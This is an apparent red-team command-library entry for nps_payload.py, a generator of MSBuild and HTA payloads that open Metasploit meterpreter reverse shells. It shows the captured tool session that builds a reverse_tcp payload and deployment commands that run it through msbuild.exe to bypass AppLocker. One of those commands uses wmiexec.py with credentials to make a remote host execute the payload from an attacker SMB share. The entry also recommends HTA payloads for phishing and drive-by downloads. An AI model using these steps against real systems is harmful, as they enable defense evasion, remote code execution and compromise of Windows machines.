---
type: command
executor: bash
data: python2 nps_payload.py
output: |-
  root@kali:~/Documents/nps_payload# python nps_payload.py 

                                       (            (
                                ) (    )\        )  )\ )
    (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
    )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)
   _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |
  | ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |
  |_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
        |_|     |_____|_|         |__/

                         v1.03


          (1)     Generate msbuild/nps/msf payload
          (2)     Generate msbuild/nps/msf HTA payload
          (99)    Quit

  Select a task: 1

  Payload Selection:

          (1)     windows/meterpreter/reverse_tcp
          (2)     windows/meterpreter/reverse_http
          (3)     windows/meterpreter/reverse_https
          (4)     Custom PS1 Payload

  Select payload: 1
  Enter Your Local IP Address (None): 10.10.10.100
  Enter the listener port (443): 443
  [*] Generating PSH Payload...
  [*] Generating MSF Resource Script...
  [+] Metasploit resource script written to msbuild_nps.rc
  [+] Payload written to msbuild_nps.xml

  1. Run \"msfconsole -r msbuild_nps.rc\" to start listener.
  2. Choose a Deployment Option (a or b): - See README.md for more information.
    a. Local File Deployment:
      - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
    b. Remote File Deployment:
      - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - msbuild
  - defense-evasion
verified: true
validated: true
---

# run-nps-payload-generator

## Command

```bash
python2 nps_payload.py
```

## Description

This command executes the nps_payload.py script in an interactive mode to generate evasion-focused payloads. It prompts the user to select between MSBuild XML payloads for Windows execution (bypassing AppLocker) or HTA payloads for web delivery, along with Metasploit integration for reverse connections. Use this during payload preparation in red team engagements targeting Windows environments with strict application controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | The script is interactive; no CLI parameters. Prompts guide selection of payload type (MSBuild/HTA), payload variant (reverse_tcp/http/etc.), LHOST, and LPORT. | No |

## Examples

### Basic Usage

```bash
python2 nps_payload.py
```

Follow the on-screen prompts:
- Choose 1 for MSBuild payload.
- Select 1 for windows/meterpreter/reverse_tcp.
- Input LHOST (e.g., 10.10.10.100) and LPORT (e.g., 443).

This creates `msbuild_nps.xml` (payload) and `msbuild_nps.rc` (Metasploit resource).

### Advanced Usage

For Python 3 (if script is updated for compatibility):

```bash
python3 nps_payload.py
```

Select 2 for HTA payload generation, suitable for phishing or drive-by downloads.

## Expected Output

The command displays an ASCII art banner, version (v1.03), and interactive menu. Upon selection, it shows progress like "[*] Generating PSH Payload..." and confirms file creation:

[+] Metasploit resource script written to msbuild_nps.rc
[+] Payload written to msbuild_nps.xml

Deployment instructions follow, including running `msfconsole -r msbuild_nps.rc` on the attacker side and executing via MSBuild on the target (local or remote via SMB/WMI).

## Related

- [[tools/nps-payload-generator]]
- [[procedures/Windows-AppLocker-Bypass-Using-MSBuild]]
